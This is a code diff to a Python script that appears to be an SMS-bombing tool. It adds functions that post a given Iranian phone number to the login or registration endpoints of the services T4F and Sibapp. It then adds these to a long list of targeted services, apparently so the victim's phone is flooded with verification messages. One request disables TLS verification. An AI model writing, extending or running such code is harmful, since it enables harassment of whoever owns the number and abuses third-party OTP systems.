@@ -416,6 +416,28 @@ def tetherland(phone):
         return success
     except: return False
 
+
+def t4f(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://www.t4f.ir/api/v1/auth/login", json={"mobile": phone}, headers={"Content-Type": "application/json"}, timeout=10)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] T4F: {r.status_code}")
+        return success
+    except: return False
+
+
+def sibapp(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://api.sibapp.net/api/v1/user/register", 
+                          json={"phone_number": phone}, 
+                          headers={"Content-Type": "application/json"}, timeout=10, verify=False)
+        success = r.status_code in [200, 201]
+        print(f"[{'+' if success else '-'}] Sibapp: {r.status_code}")
+        return success
+    except: return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
@@ -424,7 +446,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland
+    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland, t4f, sibapp
 ]
 
 
